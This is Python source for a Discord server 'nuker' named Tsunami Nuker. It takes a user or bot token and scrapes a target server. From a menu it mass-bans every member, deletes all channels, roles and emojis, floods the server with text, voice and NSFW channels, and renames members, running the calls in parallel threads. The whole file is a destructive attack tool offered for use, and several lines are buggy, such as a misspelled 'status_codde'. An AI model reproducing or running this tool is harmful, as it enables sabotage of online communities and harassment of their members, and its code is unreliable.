import discord
import requests
from discord.ext import commands
from requests_futures.sessions import FuturesSession
from time import sleep
from threading import Thread
from os import _exit, system, remove

system('cls & mode 120,20 & title Tsunami Nuker - Loading')
token = input('\x1b[37;5;56m[\x1b[34;5;56mTOKEN\x1b[37;5;56m]:  \x1b[0m')
system('cls')
session = FuturesSession()

def check():
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'{token}'})
    if r.status_code == 200:
        return "user"
    else:
        return "bot"

tsu_token = check() 
intents = discord.Intents.all()
intents.members = True

if tsu_token == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix='tsu', case_insenitive=True, self_bot=True, intents=intents)
elif tsu_token == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix='tsu', case_insensitive=True, intents=intents)

class Tsunami:
    def __init__(self):
        self.blue = '\x1b[34;5;56m' 
        self.white = '\x1b[37;5;56m'
        self.reset = '\033[37m'
        self.red = '\x1b[31;5;56m'
        self.cyan = '\x1b[36;5;56m'

    def banall(self, guild, user):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }    
            r = session.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    

    def banall2(self, guild, user):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }    
            r = session.put(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    

    def banall3(self, guild, user):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }    
            r = session.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    

    def banall4(self, guild, user):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }    
            r = session.put(f'https://canary.discordapp.com/api/v8/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    

    def deletechannels(self, guild, channel):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }        
            r = session.delete(f'https://canary.discordapp.com/api/v9/channels/{str(channel)}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {channel.strip()}{self.white}]{self.reset}')        

    def deletechannels2(self, guild, channel):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }        
            r = session.delete(f'https://discord.com/api/v9/channels/{channel}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {channel.strip()}{self.white}]{self.reset}')                  

    def deleteroles(self, guild, role):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}', json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {role.strip()}{self.white}]{self.reset}') 
 
    def deleteroles2(self, guild, role):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{role}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {role.strip()}{self.white}]{self.reset}') 

    def deleteemojis(self, guild, emoji):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/emojis/{emoji}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {emoji.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {emoji.strip()}{self.white}]{self.reset}') 

    def nicknameall(self, guild, user, name):
        while True:
            payload = {
                'nick': name
            }
            r = requests.patch(f'https://discord.com/api/v9/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY NICKNAMED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO NICKNAME {user.strip()}{self.white}]{self.reset}') 

    def spamchannels(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 

    def spamchannels2(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 
            
    def spamnsfw(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0,
                'nsfw': True
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 

    def spamvcchannels(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 2
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}')      

    def spamroles(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 2
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{guild}/roles', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}')                      

    async def scrape(self):  
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        await client.wait_until_ready()
        target = client.get_guild(int(guild))
        members = await target.chunk()

        try:
            remove('members.txt')
            remove('channels.txt')
            remove('roles.txt')
            remove('emojis.txt')
        except:
            pass

        membercount = 0
        with open('members.tsu', 'a') as m:
            for member in members:
                m.write(str(member.id) + '\n')
                membercount += 1
            print(f'{self.white}[{self.blue}SCRAPED {membercount} USERS{self.white}]{self.reset}')   
            m.close()

        channelcount = 0  
        with open('channels.tsu', 'a') as c:
            for channel in target.channels:
                 c.write(str(channel.id) + '\n')
            channelcount += 1
            print(f'{self.white}[{self.blue}SCRAPED {channelcount} CHANNELS{self.white}]{self.reset}')
            c.close()

        rolecount = 0
        with open('roles.tsu', 'a') as r:
            for role in target.roles:
                r.write(str(role.id) + '\n')
                rolecount += 1
            print(f'{self.white}[{self.blue}SCRAPED {rolecount} ROLES{self.white}]{self.reset}')   
            r.close()  

        emojicount = 0
        with open('emojis.tsu', 'a') as e:
            for emoji in target.emojis:
                e.write(str(emoji.id) + '\n')
                emojicount += 1
            print(f'{self.white}[{self.blue}SCRAPED {emojicount} EMOJIS{self.white}]{self.reset}')   
            e.close()  

    async def tsuban(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        members = open('members.tsu') 
        for member in members:
            Thread(target=self.banall, args=(guild, member)).start()
        members.close()

    async def tsuban2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        members = open('members.tsu') 
        for member in members:
            Thread(target=self.banall2, args=(guild, member)).start()
        members.close()    

    async def tsuban3(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        members = open('members.tsu') 
        for member in members:
            Thread(target=self.banall3, args=(guild, member)).start()
        members.close()    

    async def tsuban4(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        members = open('members.tsu') 
        for member in members:
            Thread(target=self.banall4, args=(guild, member)).start()
        members.close()    

    async def tsudc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        channels = open('channels.tsu') 
        for channel in channels:
            Thread(target=self.deletechannels, args=(guild, channel)).start()
        channels.close()      

    async def tsudc2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        channels = open('channels.tsu') 
        for channel in channels:
            Thread(target=self.deletechannels2, args=(guild, channel)).start()
        channels.close()

    async def tsudr(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        roles = open('roles.tsu') 
        for role in roles:
            Thread(target=self.deleteroles, args=(guild, role)).start()
        roles.close()           

    async def tsudr2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        roles = open('roles.tsu') 
        for role in roles:
            Thread(target=self.deleteroles2, args=(guild, role)).start()
        roles.close()               

    async def tsude(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        emojis = open('emojis.tsu') 
        for emoji in emojis:
            Thread(target=self.deleteemojis, args=(guild, emoji)).start()
        emojis.close()     

    async def tsucc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamchannels, args=(guild, name)).start()

    async def tsucc2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamchannels2, args=(guild, name)).start()        

    async def tsusvc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamvcchannels, args=(guild, name)).start()

    async def tsusnc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamnsfw, args=(guild, name)).start()         

    async def tsunick(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}NAME{self.white}]: {self.reset}')
        members = open('members.tsu')
        for member in members:
            Thread(target=self.nicknameall, args=(guild, name, member)).start()
        members.close()    

    async def tsuxlux(self):
        system('cls & mode 120,20 & title Tsunami Nuker')
        print(f'''
                     {self.blue}[{self.white}tsu#1800 | hoodrich#1800{self.blue}]{self.reset}
        ''')
        print(f'''
                        {self.blue}╔╦╗╔═╗╦ ╦╔╗╔╔═╗╔╦╗╦  
                         {self.cyan}║ ╚═╗║ ║║║║╠═╣║║║║  
                         {self.white}╩ ╚═╝╚═╝╝╚╝╩ ╩╩ ╩╩  
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       {self.blue}Logged In As {client.user.name}           
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          {self.blue}╔═══════════════════════════════════════════════════╗
          {self.blue}║ {self.white}1: Banall - Bans All Scraped Users                {self.blue}║
          {self.blue}║ {self.white}2: Channel - Deletes All Scraped Channels         {self.blue}║
          {self.blue}║ {self.white}3: Roles - Deletes All Scraped Roles              {self.blue}║
          {self.blue}║ {self.white}4: Emojis - Deletes All Scraped Emojis            {self.blue}║
          {self.blue}║ {self.white}5: Spam Channels - Spams Channels                 {self.blue}║
          {self.blue}║ {self.white}6: Spam Voice Channels - Spams Voice Channels     {self.blue}║ 
          {self.blue}║ {self.white}7: Spam NSFW Channels - Spams NSFW Channels       {self.blue}║ 
          {self.blue}║ {self.white}8: Nickname - Nicknames All Scraped Users         {self.blue}║
          {self.blue}║ {self.white}9: Scrape - Scrapes The Guild                     {self.blue}║ 
          {self.blue}╚═══════════════════════════════════════════════════╝
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{self.reset}''')  
        option = input('\x1b[37;5;56m[\x1b[34;5;56mOPTION\x1b[37;5;56m]:  \x1b[0m')
        if option == '1':
            await self.tsuban() + self.tsuban2() + self.tsuban3() + self.tsuban4()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '2':
            await self.tsudc() + self.tsudc2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '3':
            await self.tsudr() + self.tsudr2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '4':
            await self.tsude()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '5':
            await self.tsucc() + self.tsucc2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '6':
            await self.tsusvc()
            sleep(1.5)
            system('cls')
            await self.tsuxlux() 
        elif option == '7':
            await self.tsusnc()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '8':
            await self.tsunick()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '9':
            await self.scrape()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()

    def TSURUN(self):
        if tsu_token == "user":
            try:
                client.run(token, bot=False)
            except:     
                print(f'{self.white}[{self.red}INVALID TOKEN{self.white}]{self.reset}') 
        elif tsu_token == "bot":
            try:
                client.run(token, bot=True)
            except:   
                print(f'{self.white}[{self.red}INVALID TOKEN{self.white}]{self.reset}') 
        else:
            _exit(0)                  

    @client.event
    async def on_connect():
        await Tsunami().tsuxlux()

if __name__ == "__main__":
    Tsunami().TSURUN()
